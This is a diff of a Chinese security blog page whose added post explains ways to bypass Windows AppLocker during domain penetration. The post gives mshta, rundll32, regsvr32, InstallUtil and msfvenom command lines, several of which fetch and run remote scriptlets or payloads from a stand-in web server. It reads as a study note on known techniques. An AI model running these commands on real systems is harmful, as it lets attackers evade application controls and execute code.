@@ -78,7 +78,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="web,域渗透,">
 
 
 
@@ -96,16 +96,18 @@
 
 
 
-<meta name="description" content="Please remember that. The Titanic was not supposed to sink, but it did.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Blog of 1ypt0">
-<meta property="og:url" content="http://lypto.me/archives/2018/05/index.html">
+<meta name="description" content="前一篇关于域渗透的文章主要介绍了域渗透过程中的权限的横向移动策略，主要原理是依赖windows的认证机制，在域环境下主要是DA的域密码文件hash的导出,彩虹表明文破解和内存明文密码抓取，或者使用kerberos用户的hash伪造黄金票据进行域扩散等。这篇文章主要是想说明下Windows AppLocker的绕过。文章是在看了乌云大会2016年的议题：Shell is Only the Begi">
+<meta name="keywords" content="web,域渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域渗透（二）">
+<meta property="og:url" content="http://lypto.me/2019/02/14/域渗透（二）/index.html">
 <meta property="og:site_name" content="Blog of 1ypt0">
-<meta property="og:description" content="Please remember that. The Titanic was not supposed to sink, but it did.">
+<meta property="og:description" content="前一篇关于域渗透的文章主要介绍了域渗透过程中的权限的横向移动策略，主要原理是依赖windows的认证机制，在域环境下主要是DA的域密码文件hash的导出,彩虹表明文破解和内存明文密码抓取，或者使用kerberos用户的hash伪造黄金票据进行域扩散等。这篇文章主要是想说明下Windows AppLocker的绕过。文章是在看了乌云大会2016年的议题：Shell is Only the Begi">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-02-13T17:01:31.967Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Blog of 1ypt0">
-<meta name="twitter:description" content="Please remember that. The Titanic was not supposed to sink, but it did.">
+<meta name="twitter:title" content="域渗透（二）">
+<meta name="twitter:description" content="前一篇关于域渗透的文章主要介绍了域渗透过程中的权限的横向移动策略，主要原理是依赖windows的认证机制，在域环境下主要是DA的域密码文件hash的导出,彩虹表明文破解和内存明文密码抓取，或者使用kerberos用户的hash伪造黄金票据进行域扩散等。这篇文章主要是想说明下Windows AppLocker的绕过。文章是在看了乌云大会2016年的议题：Shell is Only the Begi">
 
 
 
@@ -133,13 +135,13 @@
 
 
 
-  <link rel="canonical" href="http://lypto.me/archives/2018/05/">
+  <link rel="canonical" href="http://lypto.me/2019/02/14/域渗透（二）/">
 
 
 
 
 
-  <title>归档 | Blog of 1ypt0</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  <title>域渗透（二） | Blog of 1ypt0</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
 
 <body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -174,7 +176,7 @@
   
     
   
-  <div class="container sidebar-position-left  page-archive  ">
+  <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 	<a href="https://github.com/IversionBY"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_red_aa0000.png" alt="Fork me on GitHub"></a>
     <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
@@ -300,63 +302,315 @@
           <div id="content" class="content">
             
 
-  <section id="posts" class="posts-collapse">
-    <span class="archive-move-on"></span>
+  <div id="posts" class="posts-expand">
+    
 
-    <span class="archive-page-counter">
-      
-      
-       
-      
-      OK! 目前共计 43 篇日志。 继续努力。
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://lypto.me/2019/02/14/域渗透（二）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="1ypt0">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/109.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog of 1ypt0">
     </span>
 
     
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">域渗透（二）</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-14T01:00:16+08:00">
+                Feb 14 2019
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/02/14/域渗透（二）/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/02/14/域渗透（二）/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  1.7k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  7
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
 
       
       
-      
 
+      
+        <blockquote>
+<p>前一篇关于域渗透的文章主要介绍了域渗透过程中的权限的横向移动策略，主要原理是依赖windows的认证机制，在域环境下主要是DA的域密码文件hash的导出,彩虹表明文破解和内存明文密码抓取，或者使用kerberos用户的hash伪造黄金票据进行域扩散等。这篇文章主要是想说明下Windows AppLocker的绕过。文章是在看了乌云大会2016年的议题：Shell is Only the Beginning后，对议题相关知识细节进行学习的记录。</p>
+</blockquote>
+<a id="more"></a>
+<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>所谓的Windows AppLocker绕过，指的是“应用程序控制策略”Bypass。在windwos7和windows server 2008 后开始启用。可以简单的理解为对应用程序加了一层防火墙，通过指定执行策略指定了哪些应用可以被执行。包括可执行的程序路径，可执行的程序类型，指定可执行相应程序的用户组等。在AppLocker开启的情况下，默认的策略如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 允许本地管理员组的成员运行所有应用程序。</span><br><span class="line">2. 允许 Everyone 组的成员运行位于 Windows 文件夹中的应用程序。</span><br><span class="line">3. 允许 Everyone 组的成员运行位于 Program Files 文件夹中的应用程序。</span><br></pre></td></tr></table></figure></p>
+<p>在支持Windows AppLocker 的windows版本中，我们可以通过打开本地安全策略进行操作。<code>[Win]+R</code>输入`secpol.msc``打开本地安全策略。</p>
+<p>由于Windows AppLocker的存在，在渗透的时候我们有时就需要对这些策略进行绕过。本文就是介绍各种绕过思路。</p>
+<h1 id="0x02-HTA（HTML-Application）"><a href="#0x02-HTA（HTML-Application）" class="headerlink" title="0x02 HTA（HTML Application）"></a>0x02 HTA（HTML Application）</h1><p>HTA的实现是一种设计理念。直接将HTML保存成HTA的格式，就是一个独立的应用软件。这样html的运行就可以脱离浏览器成为一个独立的软件运行(所以拥有读写文件、操作注册表等权限)。由于可以把.hta后缀文件单独运行，而HTA本身可执行性是在Windows AppLocker默认策略白名单之内的，这样我们可以得到一种绕过Windows AppLoacker白名单的方式: <code>mshta.exe payload.tha</code></p>
+<h2 id="利用方式1："><a href="#利用方式1：" class="headerlink" title="利用方式1："></a>利用方式1：</h2><p>直接写入文件，html调用VBscript搞事情<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 有弹窗</span><br><span class="line">&lt;script LANGUAGE=&quot;VBScript&quot;&gt;</span><br><span class="line">Set cmd = CreateObject(&quot;WScript.Shell&quot;) </span><br><span class="line">cmd.run(&quot;ping 1.1.1.1&quot;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"># 无弹窗</span><br><span class="line">&lt;SCRIPT LANGUAGE=&quot;VBScript&quot;&gt;</span><br><span class="line">set a = CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">visible = false</span><br><span class="line">a.run &quot;mshta.exe &quot;&quot;file:///evil.hta&quot;&quot;&quot;, visible</span><br><span class="line">window.close()</span><br><span class="line">&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="利用方式2："><a href="#利用方式2：" class="headerlink" title="利用方式2："></a>利用方式2：</h2><p>无文件攻击，内存代码执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</span><br><span class="line"></span><br><span class="line">mshta http://webserver/payload.hta</span><br><span class="line"></span><br><span class="line">mshta javascript:alert(&apos;hello&apos;);window.close();</span><br><span class="line"></span><br><span class="line">Mshta.exe vbscript:CreateObject(&quot;Wscript.Shell&quot;).Run(&quot;calc.exe&quot;,0,true)(window.close)</span><br></pre></td></tr></table></figure></p>
+<h2 id="利用方式3："><a href="#利用方式3：" class="headerlink" title="利用方式3："></a>利用方式3：</h2><p>结合CVE-2017-11882,word文档执行HTA</p>
+<blockquote>
+<p><a href="https://github.com/Ridter/CVE-2017-11882/" target="_blank" rel="noopener">https://github.com/Ridter/CVE-2017-11882/</a></p>
+</blockquote>
+<h1 id="0x03-Rundll32"><a href="#0x03-Rundll32" class="headerlink" title="0x03 Rundll32"></a>0x03 Rundll32</h1><blockquote>
+<p>细节参考： <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32</a></p>
+</blockquote>
+<p>Rundll32是微软的一个原生程序用以传入参数的方式来显式的调用动态库中的函数。同时Rundll32是默认白名单的，可以作为绕过AppLocker的一种手段。根据这一特性，我们可以编写pac.dll，利用Rundll32实现代码执行。根据官方的文档手册，我们可以得出Rundll32程序的命令行使用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">The command line for Rundll is as follows:</span><br><span class="line">   RUNDLL.EXE &lt;dllname&gt;,&lt;entrypoint&gt; &lt;optional arguments&gt;</span><br><span class="line">An example is as follows:</span><br><span class="line">   RUNDLL.EXE SETUPX.DLL,InstallHinfSection 132 C:\WINDOWS\INF\SHELL.INF</span><br></pre></td></tr></table></figure></p>
+<p>当然有成型的工具可以帮助我们构建poc,这里比较大众的思路是使用msfvenom这类工具来自动化的生成poc.dll<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p &lt;payload&gt; &lt;payload options&gt; -a &lt;arch&gt; --platform &lt;platform&gt; -e &lt;encoder option&gt; -i &lt;encoder times&gt; -b &lt;bad-chars&gt; -n &lt;nopsled&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br><span class="line"></span><br><span class="line"># 其中payload可以通过以下命令查看，同理（payloads, encoders, nops, platforms, archs, formats, all）</span><br><span class="line">msfvenom -l payloads</span><br><span class="line"></span><br><span class="line"># 查询某个payload参数，以windows tcp为例</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp --payload-options</span><br></pre></td></tr></table></figure></p>
+<p>当然我们也可以利用Rundll32来执行javascript</p>
+<blockquote>
+<p>细节参考：<a href="https://blog.csdn.net/caizi001/article/details/52853870" target="_blank" rel="noopener">https://blog.csdn.net/caizi001/article/details/52853870</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;[js payload]</span><br><span class="line">#例子：</span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;alert(&apos;foo&apos;);</span><br></pre></td></tr></table></figure>
+<p>当然除了使用rundll32以命令行的方式执行dll外还可以将dll重命名cpl，双击运行。</p>
+<blockquote>
+<p>还有一些博客提到的利用rundll32打开自定义的cmd和注册表项的骚思路，这里在ws2012上测试没通过就没有细说，有兴趣可以参考：<a href="http://www.4hou.com/technology/5737.html" target="_blank" rel="noopener">http://www.4hou.com/technology/5737.html</a></p>
+</blockquote>
+<h1 id="0x04-Regsvr32"><a href="#0x04-Regsvr32" class="headerlink" title="0x04 Regsvr32"></a>0x04 Regsvr32</h1><p>Regsvr32命令用于注册动态链接库文件，是 Windows 系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行</p>
+<blockquote>
+<p>细节参考：<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 软件使用参数：</span><br><span class="line">regsvr32 [/u] [/s] [/n] [/i[:cmdline]] &lt;DllName&gt;</span><br><span class="line">/u</span><br><span class="line">卸载已安装的控件或DLL文件</span><br><span class="line">/s</span><br><span class="line">静默，不显示任何消息框</span><br><span class="line">/n</span><br><span class="line">指定不调用 DllRegisterServer，此选项必须与 /i 共同使用</span><br><span class="line">/i:cmdline</span><br><span class="line">调用 DllInstall 将它传递到可选的 [cmdline]，在与 /u 共同使用时，它调用 dll 卸载</span><br><span class="line">dllname</span><br><span class="line">指定要注册的 dll 文件名</span><br><span class="line"># 常用的利用方式包括</span><br><span class="line">--- 1.local COM scriptlet execution</span><br><span class="line">--- 2.remote COM scriptlet execution</span><br><span class="line"># 例子</span><br><span class="line">--- 1.regsvr32 /u /n /s /i:padload.sct scrobj.dll</span><br><span class="line">--- 2.regsvr32 /u /n /s /i:http://ip:port/payload.sct scrobj.dll</span><br><span class="line"></span><br><span class="line">--- 参考：https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md</span><br></pre></td></tr></table></figure>
+<p>一个在windows10关闭杀软的条件下运行计算器的payload。测试在MS server 2012 无法顺利执行（SCT文件的构造原理和细节推荐阅读参考文献[8]）<br><code>regsvr32 /i https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct</code></p>
+<p>通过三好学生前辈的细致入微的解读，我们可以知道，通过在卸载控件时候加入Exec函数的功能调用可以直接在卸载时运行任意代码（calc.sct中Exec函数里面的payload），同时卸载控件的操作不需要管理员权限，也不需要写入注册表,所以可以成为绕过AppLocker的不二手段。</p>
+<h1 id="InstallUtil"><a href="#InstallUtil" class="headerlink" title="InstallUtil"></a>InstallUtil</h1><blockquote>
+<p>工具细节移步：<a href="https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool</a>  </p>
+</blockquote>
+<p>常用的两个步骤：编译cs,执行exe</p>
+<p>Installutil.exe所在路径没有被系统添加PATH环境变量中,因此需要按照如下命令执行方式使用绝对路径运行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:PELoader.exe PELoader.cs</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U PELoader.exe</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>参考文献：<br>[1]<a href="https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/critical-office-zero-day-attacks-detected-wild/?spm=a2c4e.11153940.blogcont205944.10.47ab657fMZ7L6E" target="_blank" rel="noopener">https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/critical-office-zero-day-attacks-detected-wild/?spm=a2c4e.11153940.blogcont205944.10.47ab657fMZ7L6E</a><br>[2]<a href="https://paper.seebug.org/265/" target="_blank" rel="noopener">https://paper.seebug.org/265/</a><br>[3]<a href="https://zhuanlan.zhihu.com/p/48968904" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/48968904</a><br>[4]<a href="http://drops.xmd5.com/static/drops/tips-11804.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-11804.html</a><br>[5]<a href="https://yq.aliyun.com/articles/205944" target="_blank" rel="noopener">https://yq.aliyun.com/articles/205944</a><br>[6]<a href="https://cloud.tencent.com/developer/article/1044559" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1044559</a><br>[7]<a href="https://docs.microsoft.com/en-us/previous-versions//ms536473(v=vs.85" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions//ms536473(v=vs.85</a>)<br>[8]<a href="http://drops.xmd5.com/static/drops/tips-15124.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-15124.html</a></p>
+</blockquote>
+
+      
+    </div>
+
+    <div>
       
         
-        <div class="collection-title">
-          <h2 class="archive-year motion-element" id="archive-year-2018">2018</h2>
+
+      
+    </div>
+	<div>
+      
+      <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+	  
+	</div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文标题:</strong>
+    <a href="/2019/02/14/域渗透（二）/">域渗透（二）</a>
+  </li>
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    1ypt0
+  </li>
+  <li class="post-copyright-author">
+    <strong>发布时间:</strong>
+    2019年02月14日 - 01:02
+  </li>
+  <li class="post-copyright-author">
+    <strong>最后更新:</strong>
+    2019年02月14日 - 01:02
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://lypto.me/2019/02/14/域渗透（二）/" title="域渗透（二）">http://lypto.me/2019/02/14/域渗透（二）/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/域渗透/" rel="tag"># 域渗透</a>
+          
         </div>
       
+
+      
+        
       
 
       
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/25/域渗透（一）/" rel="next" title="域渗透（一）">
+                <i class="fa fa-chevron-left"></i> 域渗透（一）
+              </a>
+            
+          </div>
 
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
+          <span class="post-nav-divider"></span>
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/05/09/ajax全局变量赋值的坑/" itemprop="url">
-              
-                <span itemprop="name">ajax全局变量赋值的坑</span>
-              
-            </a>
-        
-      </h2>
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-05-09T10:06:28+08:00" content="May 9 2018">
-          05-09
-        </time>
-      </div>
-
-    </header>
+      
+      
+    </footer>
   </article>
 
 
 
-    
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
 
-  </section>
-
-  
-
+      
+    </div>
+  </div>
 
 
           </div>
@@ -364,6 +618,17 @@
 
 
           
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
 
         </div>
         
@@ -382,8 +647,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image" src="/uploads/109.jpg" alt="1ypt0">
           <p class="site-author-name" itemprop="name">1ypt0</p>
@@ -538,6 +812,22 @@
       </div></section>
 
       
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-概述"><span class="nav-number">1.</span> <span class="nav-text">0x01 概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-HTA（HTML-Application）"><span class="nav-number">2.</span> <span class="nav-text">0x02 HTA（HTML Application）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式1："><span class="nav-number">2.1.</span> <span class="nav-text">利用方式1：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式2："><span class="nav-number">2.2.</span> <span class="nav-text">利用方式2：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式3："><span class="nav-number">2.3.</span> <span class="nav-text">利用方式3：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-Rundll32"><span class="nav-number">3.</span> <span class="nav-text">0x03 Rundll32</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-Regsvr32"><span class="nav-number">4.</span> <span class="nav-text">0x04 Regsvr32</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#InstallUtil"><span class="nav-number">5.</span> <span class="nav-text">InstallUtil</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
 
       
 
@@ -635,11 +925,9 @@
   
 
   
-  
-    <script type="text/javascript" id="motion.page.archive">
-      $('.archive-year').velocity('transition.slideLeftIn');
-    </script>
-  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
 
 
   
@@ -658,6 +946,18 @@
       <script id="dsq-count-scr" src="https://iversion lee.disqus.com/count.js" async></script>
     
 
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://lypto.me/2019/02/14/域渗透（二）/';
+          this.page.identifier = '2019/02/14/域渗透（二）/';
+          this.page.title = '域渗透（二）';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://iversion lee.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
     
 
   
@@ -1036,26 +1336,6 @@
 
 
   
-  
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Config({
-        tex2jax: {
-          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
-          processEscapes: true,
-          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-        }
-      });
-    </script>
-
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for (i=0; i < all.length; i += 1) {
-          all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-      });
-    </script>
-    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
   
 
 
